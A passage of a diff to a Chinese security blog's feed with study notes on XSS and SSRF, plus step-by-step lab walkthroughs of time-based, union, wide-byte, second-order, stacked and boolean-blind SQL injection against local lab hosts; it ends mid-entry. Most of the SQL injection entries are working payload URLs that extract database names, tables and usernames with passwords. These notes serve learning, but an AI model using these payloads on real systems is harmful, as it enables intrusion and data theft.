src="https://img-blog.csdn.net/20180813105719229?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><h3 id="2、存储型XSS："><a href="#2、存储型XSS：" class="headerlink" title="2、存储型XSS："></a>2、存储型XSS：</h3><p>存储型XSS又称为持久性XSS，攻击脚本将被永久地存放在服务器的数据库或文件中，具有很高的隐蔽性。</p><p>攻击方式：这种攻击多见于论坛，博客和留言板，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><p><img src="https://img-blog.csdn.net/20180731102657466?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p><img src="https://img-blog.csdn.net/20180731102543536?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p><img src="https://img-blog.csdn.net/20180813105811861?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><h3 id="3、DOM型XSS："><a href="#3、DOM型XSS：" class="headerlink" title="3、DOM型XSS："></a>3、DOM型XSS：</h3><p>DOM 型xss其实是一种特殊类型的反射型xss它是基于DOM文档对象模型的一种漏洞。</p><p>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在XSS漏洞。</p><p><img src="https://img-blog.csdn.net/20180731103229337?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><p><img src="https://img-blog.csdn.net/2018081310585924?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><h3 id="三种不同类型的XSS之间的区别："><a href="#三种不同类型的XSS之间的区别：" class="headerlink" title="*三种不同类型的XSS之间的区别："></a>*三种不同类型的XSS之间的区别：</h3><p><img src="https://img-blog.csdn.net/20180731103652935?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2V4dHJlbWViaW5nbw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt="img"></p><h1 id="XSS常见攻击："><a href="#XSS常见攻击：" class="headerlink" title="XSS常见攻击："></a>XSS常见攻击：</h1><p>盗取cookie</p><p>获得位置信息</p><p>……</p><h3 id="参考-https-blog-csdn-net-extremebingo-article-details-81176394"><a href="#参考-https-blog-csdn-net-extremebingo-article-details-81176394" class="headerlink" title="参考:https://blog.csdn.net/extremebingo/article/details/81176394"></a>参考:<a href="https://blog.csdn.net/extremebingo/article/details/81176394" target="_blank" rel="noopener">https://blog.csdn.net/extremebingo/article/details/81176394</a></h3>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;XSS概念：&quot;&gt;&lt;a href=&quot;#XSS概念：&quot; class=&quot;headerlink&quot; title=&quot;XSS概念：&quot;&gt;&lt;/a&gt;XSS概念：&lt;/h1&gt;&lt;p&gt;XSS(Cross Site Script)名为跨站脚本攻击，为了与层叠样式表CSS区分，将跨站脚本简写为X
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SSRF</title>
+    <link href="http://yoursite.com/2019/08/09/SSRF/"/>
+    <id>http://yoursite.com/2019/08/09/SSRF/</id>
+    <published>2019-08-09T14:47:56.380Z</published>
+    <updated>2019-08-09T14:54:49.769Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="SSRF概念："><a href="#SSRF概念：" class="headerlink" title="SSRF概念："></a>SSRF概念：</h1><p>SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是要目标网站的内部系统。（因为他是从内部系统访问的，所有可以通过它攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p><h1 id="SSRF漏洞产生原因："><a href="#SSRF漏洞产生原因：" class="headerlink" title="SSRF漏洞产生原因："></a>SSRF漏洞产生原因：</h1><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档，等等。</p><p>首先，我们要对目标网站的架构了解。比如 ： A网站，是一个所有人都可以访问的外网网站，B网站是一个他们内部的OA网站。</p><p>所以，我们普通用户只可以访问a网站，不能访问b网站。但是我们可以同过a网站做中间人，访问b网站，从而达到攻击b网站需求。</p><p>正常用户访问网站的流程是：<br>输入A网站URL –&gt; 发送请求 –&gt; A服务器接受请求（没有过滤），并处理 –&gt;返回用户响应。</p><p>那网站有个请求是<a href="http://www.baidu,com/xxx.php?image=URL" target="_blank" rel="noopener">www.baidu,com/xxx.php?image=URL</a></p><p>那么产生SSRF漏洞的环节在哪里呢？安全的网站应接收请求后，检测请求的合法性。</p><p>产生的原因：服务器端的验证并没有对其请求获取图片的参数（image=）做出严格的过滤以及限制，导致A网站可以从其他服务器的获取数据<br>。</p><p>例如：<br><a href="http://www.baidu.com/xxx.php?image=www.abc.com/1.jpg" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=www.abc.com/1.jpg</a></p><p>如果我们将<a href="http://www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？" target="_blank" rel="noopener">www.abd.com/1.jpg换为与该服务器相连的内网服务器地址会产生什么效果呢？</a><br>如果存在该内网地址就会返回1xx 2xx 之类的状态码，不存在就会其他的状态码</p><p>终极简析: SSRF漏洞就是通过篡改获取资源的请求发送给服务器，但是服务器并没有检测这个请求是否合法的，然后服务器以他的身份来访问其他服务器的资源。</p><h1 id="SSRF用途："><a href="#SSRF用途：" class="headerlink" title="SSRF用途："></a>SSRF用途：</h1><p>*内外网的端口和服务扫描</p><p>*主机本地敏感数据的读取</p><p>*内外网主机应用程序漏洞利用</p><p>*内外Web站点漏洞的利用</p><h1 id="SSRF漏洞的寻找："><a href="#SSRF漏洞的寻找：" class="headerlink" title="SSRF漏洞的寻找："></a>SSRF漏洞的寻找：</h1><p>*通过URL地址分享网页内容</p><p>*转码服务</p><p>*在线翻译</p><p>*通过URL地址加载或下载图片</p><p>*图片，文章收藏功能</p><p>*未公开的api实现以及其他调用URL功能</p><p>*从URL关键字中寻找</p><p>​    如：share，wap，url，link，src，source，target，u，3g，display，sourceURL，imageURL，domain……</p><h1 id="SSRF漏洞验证方法："><a href="#SSRF漏洞验证方法：" class="headerlink" title="SSRF漏洞验证方法："></a>SSRF漏洞验证方法：</h1><p>*因为SSRF漏洞是让服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器端发送的，从而判断是否存在SSRF漏洞</p><p>*在页面源码中查找访问的资源地址，如果该资源地址类型为<a href="http://www.baidu.com/xxx.php?image=(地址)的就可能存在SSRF漏洞" target="_blank" rel="noopener">www.baidu.com/xxx.php?image=(地址)的就可能存在SSRF漏洞</a></p><h3 id="参考：https-www-jianshu-com-p-d1d1c40f6d4c"><a href="#参考：https-www-jianshu-com-p-d1d1c40f6d4c" class="headerlink" title="参考：https://www.jianshu.com/p/d1d1c40f6d4c"></a>参考：<a href="https://www.jianshu.com/p/d1d1c40f6d4c" target="_blank" rel="noopener">https://www.jianshu.com/p/d1d1c40f6d4c</a></h3>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;SSRF概念：&quot;&gt;&lt;a href=&quot;#SSRF概念：&quot; class=&quot;headerlink&quot; title=&quot;SSRF概念：&quot;&gt;&lt;/a&gt;SSRF概念：&lt;/h1&gt;&lt;p&gt;SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SSRF" scheme="http://yoursite.com/tags/SSRF/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>时间盲注</title>
+    <link href="http://yoursite.com/2019/08/09/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"/>
+    <id>http://yoursite.com/2019/08/09/时间盲注/</id>
+    <published>2019-08-09T14:47:44.690Z</published>
+    <updated>2019-08-09T14:59:41.388Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.53/web/time.php" target="_blank" rel="noopener">http://172.16.13.53/web/time.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断注入点及类型："><a href="#判断注入点及类型：" class="headerlink" title="判断注入点及类型："></a>判断注入点及类型：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and sleep(5)</p><p>*通过页面响应时间判断存在哪种类型的注入</p><h1 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(length(database())&gt;=1,sleep(3),1)</p><p>*if结构：if（x,y,z），若满足条件x，则执行y，否则执行z</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr(database(),1,1)=’t’,sleep(5),1)</p><p>*此处及以下操作需用到Burp，参考SQL注入基本知识-利用Burp进行盲注</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr((select column_name from information_schema.columns where table_schema=’test’  and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://172.16.13.53/web/time.php?id=1" target="_blank" rel="noopener">http://172.16.13.53/web/time.php?id=1</a> and if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1)</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*if结构语句的含义：if（x,y,z），若满足条件x，则执行y，否则执行z</p><p>*从爆库开始，后面的操作需借助Burp</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://172.16.13.53/web/time.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://172.16.13.53/web/time.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;*判断注入点及类型，见SQL注入基
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>联合注入</title>
+    <link href="http://yoursite.com/2019/08/09/%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2019/08/09/联合注入/</id>
+    <published>2019-08-09T14:47:44.688Z</published>
+    <updated>2019-08-09T14:59:45.258Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断字段数："><a href="#判断字段数：" class="headerlink" title="判断字段数："></a>判断字段数：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> order by 1-99 </p><h1 id="查看数据回显位置："><a href="#查看数据回显位置：" class="headerlink" title="查看数据回显位置："></a>查看数据回显位置：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,4,5,6</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,database(),5,6   </p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),5,6  </p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,(select group_concat(column_name) from information_schema.columns where TABLE_SCHEMA=’test’ and TABLE_NAME=’users’),5,6  </p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://127.0.0.1/web/union.php?id=1" target="_blank" rel="noopener">http://127.0.0.1/web/union.php?id=1</a> union select 1,2,3,(select group_concat(username,password) from test.users),5,6   </p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*若在查看回显位置时页面没有返回值，说明回显的数据没有地方存放，应该把id变成-1，以便回显数值，之后的操作同理。</p><p>*联合注入只能执行查询语句</p><p>*这里查询时因为有多个语句，所以用group-concat，这个语句的作用就是将所有的查询结果打包，以字符串的形式输出。还可以用limit进行逐个输出</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://127.0.0.1/web/union.php?id=1&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://127.0.0.1/web/union.php?id=1&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;*判断注入点及类型，见
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>宽字节注入</title>
+    <link href="http://yoursite.com/2019/08/09/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2019/08/09/宽字节注入/</id>
+    <published>2019-08-09T14:47:44.685Z</published>
+    <updated>2019-08-09T14:59:31.971Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://192.168.11.128/web/kuanzifu.php" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断数据库字段数："><a href="#判断数据库字段数：" class="headerlink" title="判断数据库字段数："></a>判断数据库字段数：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=1%df&#39;</a> order by 6–+</p><p>*此处的%df的作用是绕过转义，具体见文末</p><h1 id="查看数据回显位置："><a href="#查看数据回显位置：" class="headerlink" title="查看数据回显位置："></a>查看数据回显位置：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,2,3,4,5,6–+</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(database()),3,4,5,6–+</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4,5,6–+</p><p>*此处不直接跟数据库名的原因是，单引号’会被转义，会导致查询出错，所以在数据库名的位置再嵌入一次查询</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=((select table_name from information_schema.tables where table_schema=database() limit 0,1))),3,4,5,6–+</p><p>*此处内嵌的查询表名语句只能用limit，不能用group_conat，因为此时是读取单个表，相当于table_name=’users’,这里table_name只能有一个表，不能同时有多个表</p><h1 id="爆值："><a href="#爆值：" class="headerlink" title="爆值："></a>爆值：</h1><p><a href="http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/kuanzifu.php?id=-1%df&#39;</a> union select 1,(select group_concat(id) from test.users),3,4,5,6–+</p><h3 id="要点（SQL注入绕过技巧之宽字节注入）："><a href="#要点（SQL注入绕过技巧之宽字节注入）：" class="headerlink" title="要点（SQL注入绕过技巧之宽字节注入）："></a>要点（SQL注入绕过技巧之宽字节注入）：</h3><p>*宽字节注入，它的作用可以绕过转义，也是绕过转义的其中一个办法</p><p>*宽字节注入源于设置MySQL连接时错误配置为：set character_set_client=gbk；这样配置会引发编码转换从而导致的注入漏洞。(GBK导致的问题)</p><p>*当GPC开启(php.ini<br>magic_quotes_gpc = On)或使用addslashes函数过滤提交的参数时，测试注入点使用的单引号 ‘ 就会被转义为: \’，这个的作用就是对敏感函数的转义，让我们无法注入。</p><p>*如果存在宽字节注入，我们输入%df%27时首先经过上面提到的转义就会变成%df%5c%27(%5c就是反斜杠)。之后再数据库查询由于使用了GBK多字节编码，即在汉字编码范围内两个字节会被编码为一个汉字，然后MySQL服务器会对查询语句进行了GBK编码%df%5c转换成汉字，而单引号逃出了，这个时候就可以注入了。</p><p>*%df不是固定的，可以自己组合。只要是汉字就可以。<br>在mysql中，用于转义（即在字符串中的符号前加上”\”）的函数有addslashes，mysql_real_escape_string，mysql_escape_string等，还有一种情况是magic_quote_gpc，不过高版本的PHP将去除这个特性。</p><p>*GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://192.168.11.128/web/kuanzifu.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.11.128/web/kuanzifu.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;*判断注入
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>二次注入</title>
+    <link href="http://yoursite.com/2019/08/09/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2019/08/09/二次注入/</id>
+    <published>2019-08-09T14:47:44.683Z</published>
+    <updated>2019-08-09T14:59:24.775Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://192.168.11.128/web/double1.php（注册页面）" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php（注册页面）</a></p><p>​    <a href="http://192.168.11.128/web/double2.php（查询页面）" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php（查询页面）</a></p><p>**判断注入点及类型，见SQL注入基本知识-判断注入类型（查询页面进行）</p><h1 id="在注册页面传入非法字符："><a href="#在注册页面传入非法字符：" class="headerlink" title="在注册页面传入非法字符："></a>在注册页面传入非法字符：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a></p><p>*这里的zr’注册之后会传进数据库储存，查询之后就会构造出一个语句</p><p>*注册完成后会在页面返回一个id值，用这个值在查询页面执行语句</p><h1 id="在查询界面输入id进行查询："><a href="#在查询界面输入id进行查询：" class="headerlink" title="在查询界面输入id进行查询："></a>在查询界面输入id进行查询：</h1><p><a href="http://192.168.11.128/web/double2.php?id=6" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=6</a></p><p>*这里和普通的判断注入类型类似，只不过是先把构造语句放入数据库，再让他读取出来进行执行</p><h1 id="查询字段数："><a href="#查询字段数：" class="headerlink" title="查询字段数："></a>查询字段数：</h1><p><a href="http://192.168.11.128/web/double1.php?id=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?id=zr&#39;</a> order by 5–+</p><p><a href="http://192.168.11.128/web/double2.php?id=7" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=7</a></p><p>*和上面一样，将构造语句写入数据库，然后再从id读出，执行语句</p><h1 id="查看数据回显位置："><a href="#查看数据回显位置：" class="headerlink" title="查看数据回显位置："></a>查看数据回显位置：</h1><p><a href="http://192.168.11.128/web/double1.php?id=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?id=zr&#39;</a> union select 1,2,3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=8" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=8</a></p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(database()),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=9" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=9</a></p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’test’),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=10" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=10</a></p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=11" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=11</a></p><h1 id="爆数值"><a href="#爆数值" class="headerlink" title="爆数值:"></a>爆数值:</h1><p><a href="http://192.168.11.128/web/double1.php?username=zr&#39;" target="_blank" rel="noopener">http://192.168.11.128/web/double1.php?username=zr&#39;</a> union select 1,(select group_concat(id) from test.users),3–+</p><p><a href="http://192.168.11.128/web/double2.php?id=12" target="_blank" rel="noopener">http://192.168.11.128/web/double2.php?id=12</a></p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*二次注入的原理就是，将构造语句传入数据库并储存，然后查询时语句就会被执行</p><p>*这里的注册页面没有输入框，直接使用的是url，若注册页面有输入框，就不用再url里面注册，直接在注册框注册即可</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://192.168.11.128/web/double1.php（注册页面）&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.11.128/web/double1.php（注册页面）&lt;/a&gt;&lt;/p
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>堆叠注入</title>
+    <link href="http://yoursite.com/2019/08/09/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/"/>
+    <id>http://yoursite.com/2019/08/09/堆叠注入/</id>
+    <published>2019-08-09T14:47:44.680Z</published>
+    <updated>2019-08-09T15:00:54.203Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://192.168.11.128/web/duidie.php" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(length(database())&gt;=1,sleep(5),1)</p><p>*这里堆叠注入采用了时间盲注，可见；后面语句和时间盲注并无差别</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr(database(),1,1)=’t’,sleep(5),1)</p><p>*爆库名这里和盲注一样，使用Burp</p><h1 id="爆表名："><a href="#爆表名：" class="headerlink" title="爆表名："></a>爆表名：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr((select table_name from information_schema.tables where table_schema=’test’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆字段名："><a href="#爆字段名：" class="headerlink" title="爆字段名："></a>爆字段名：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr((select column_name from information_schema.columns where table_schema=’test’  and table_name=’users’ limit 0,1),1,1)=’i’,sleep(5),1)</p><h1 id="爆数值："><a href="#爆数值：" class="headerlink" title="爆数值："></a>爆数值：</h1><p><a href="http://192.168.11.128/web/duidie.php?id=1;select" target="_blank" rel="noopener">http://192.168.11.128/web/duidie.php?id=1;select</a> if(substr((select id from test.users limit 0,1),1,1)=’1’,sleep(5),1)</p><h3 id="要点："><a href="#要点：" class="headerlink" title="要点："></a>要点：</h3><p>*分号；在数据库中表示一个语句结束，分号结束后再构造一条语句就表示堆叠注入</p><p>*此处是采用的时间盲注进行的，视具体情况而定</p><p>*堆叠注入相比联合注入，它能执行任何数据库语句，而联合注入只能执行查询语句</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;例：&lt;a href=&quot;http://192.168.11.128/web/duidie.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.11.128/web/duidie.php&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;*判断注入点及类型
+      
+    
+    </summary>
+    
+      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>布尔盲注</title>
+    <link href="http://yoursite.com/2019/08/09/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8/"/>
+    <id>http://yoursite.com/2019/08/09/布尔盲注/</id>
+    <published>2019-08-09T14:47:44.677Z</published>
+    <updated>2019-08-09T14:59:34.696Z</updated>
+    
+    <content type="html"><![CDATA[<p>例：<a href="http://172.16.13.55/web/boolean.php?id=1" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1</a></p><p>*判断注入点及类型，见SQL注入基本知识-判断注入类型</p><h1 id="判断数据库长度："><a href="#判断数据库长度：" class="headerlink" title="判断数据库长度："></a>判断数据库长度：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and length(database())&gt;=4–+</p><p>*此处为了判断数据库名的长度，如数据库为test，则长度为4</p><h1 id="爆库名："><a href="#爆库名：" class="headerlink" title="爆库名："></a>爆库名：</h1><p><a href="http://172.16.13.55/web/boolean.php?id=1&#39;" target="_blank" rel="noopener">http://172.16.13.55/web/boolean.php?id=1&#39;</a> and 